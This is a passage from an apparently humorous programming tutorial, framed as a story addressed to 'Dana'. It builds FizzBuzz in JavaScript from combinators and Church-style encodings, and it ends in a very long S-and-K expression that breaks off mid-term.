    &lt;code&gt;let DECIMAL2 = B(ADD)(MULTIPLY(TEN)); // base 10

let CHAR_A = ONE;
let CHAR_B = TWO;
let CHAR_C = THREE;
let CHAR_D = FOUR;
let CHAR_E = FIVE;
let CHAR_F = SIX;
let CHAR_G = SEVEN;
let CHAR_H = EIGHT;
let CHAR_I = NINE;
let CHAR_J = TEN;
let CHAR_K = DECIMAL2(ONE)(ONE);
let CHAR_L = DECIMAL2(ONE)(TWO);
let CHAR_M = DECIMAL2(ONE)(THREE);
let CHAR_N = DECIMAL2(ONE)(FOUR);
let CHAR_O = DECIMAL2(ONE)(FIVE);
let CHAR_P = DECIMAL2(ONE)(SIX);
let CHAR_Q = DECIMAL2(ONE)(SEVEN);
let CHAR_R = DECIMAL2(ONE)(EIGHT);
let CHAR_S = DECIMAL2(ONE)(NINE);
let CHAR_T = DECIMAL2(TWO)(ZERO);
let CHAR_U = DECIMAL2(TWO)(ONE);
let CHAR_V = DECIMAL2(TWO)(TWO);
let CHAR_W = DECIMAL2(TWO)(THREE);
let CHAR_X = DECIMAL2(TWO)(FOUR);
let CHAR_Y = DECIMAL2(TWO)(FIVE);
let CHAR_Z = DECIMAL2(TWO)(SIX);
let CHAR_0 = DECIMAL2(TWO)(SEVEN);
let CHAR_1 = DECIMAL2(TWO)(EIGHT);
let CHAR_2 = DECIMAL2(TWO)(NINE);
let CHAR_3 = DECIMAL2(THREE)(ZERO);
let CHAR_4 = DECIMAL2(THREE)(ONE);
let CHAR_5 = DECIMAL2(THREE)(TWO);
let CHAR_6 = DECIMAL2(THREE)(THREE);
let CHAR_7 = DECIMAL2(THREE)(FOUR);
let CHAR_8 = DECIMAL2(THREE)(FIVE);
let CHAR_9 = DECIMAL2(THREE)(SIX);

let ARRAY = Y(
  B(S(B(S)(C(B(C(IS_EMPTY)))(END))))(
    C(B(B)(B))(C(B(B)(B))(CONS)),
  ),
)(I);

let FIZZ = ARRAY(CHAR_F)(CHAR_I)(CHAR_Z)(CHAR_Z)(END);
let BUZZ = ARRAY(CHAR_B)(CHAR_U)(CHAR_Z)(CHAR_Z)(END);
let FIZZBUZZ = CONCAT(FIZZ)(BUZZ);&lt;/code&gt;
    &lt;p&gt;Printing strings:&lt;/p&gt;
    &lt;code&gt;let extractString = (lst) =&amp;gt;
  IS_EMPTY(lst)("")(
    NTH(letters)(PRED(FIRST(lst))) + extractString(REST(lst)),
  );

console.log(extractString(FIZZBUZZ));&lt;/code&gt;
    &lt;code&gt;fizzbuzz&lt;/code&gt;
    &lt;p&gt;Just a few more loose ends. Numbers to digits. Digits to strings. Strings to output.&lt;/p&gt;
    &lt;code&gt;let array = Y(
  (h) =&amp;gt; (acc) =&amp;gt; (x) =&amp;gt;
    x === END ? acc(END) : h((t) =&amp;gt; acc(CONS(x)(t))),
)(I);

let letters =
  array("a")("b")("c")("d")("e")("f")("g")("h")("i")("j")
  ("k")("l")("m")("n")("o")("p")("q")("r")("s")("t")("u")
  ("v")("w")("x")("y")("z")
  ("0")("1")("2")("3")("4")("5")("6")("7")("8")("9")(END);

let DIGITS_NUMERAL =
  ARRAY(CHAR_0)(CHAR_1)(CHAR_2)(CHAR_3)(CHAR_4)
  (CHAR_5)(CHAR_6)(CHAR_7)(CHAR_8)(CHAR_9)(END);

let NUMBER_TO_DIGIT_LIST = Y(
  C(
    B(S)(
      C(B(B)(B(S(B(S)(IS_ZERO)))(B(CONCAT))))(C(DIVIDE)(TEN)),
    ),
  )(C(B(CONS)(C(MOD)(TEN)))(EMPTY)),
);

let NUMBER_TO_STRING = S(
  C(B(FOLD)(NUMBER_TO_DIGIT_LIST))(
    B(CONS)(NTH(DIGITS_NUMERAL)),
  ),
)(B(T(EMPTY))(K(I)));&lt;/code&gt;
    &lt;p&gt;You take a deep breath and look Dana in the eye.&lt;/p&gt;
    &lt;p&gt;“And now… the main event.”&lt;/p&gt;
    &lt;code&gt;let FIFTEEN = DECIMAL2(ONE)(FIVE);
let ONE_HUNDRED = MULTIPLY(TEN)(TEN);

let FIZZBUZZ_RESULT = MAP(RANGE(ONE)(ONE_HUNDRED))(
  S(
    B(S(C(R(FIZZBUZZ))(FIFTEEN)))(
      B(S(C(R(FIZZ))(THREE)))(
        B(C(C(R(BUZZ))(FIVE)))(NUMBER_TO_STRING),
      ),
    ),
  )(B(B(IS_ZERO))(MOD)),
);

console.log(showLines(extractString)(FIZZBUZZ_RESULT));&lt;/code&gt;
    &lt;p&gt;“Are you satisfied?” she cries. But you aren’t. Not yet.&lt;/p&gt;
    &lt;p&gt;Variables are for wimps. You replace each with its definition.&lt;/p&gt;
    &lt;code&gt;let FIZZBUZZ_RESULT = ((((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K))))))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))((((S)((K)(S)))(K))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))))((K)(K)))((((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((S)((((S)(S))((K)(((S)(K))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))))((K)(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))((((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))))))))(((S)(((((S)((K)(S)))(K))((S)(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))(((((((S)((K)(S)))(K))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K))))))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))((((((((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)((K)(S)))(K))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K)))))))))((K)(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))))(((S)(K))(K)))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((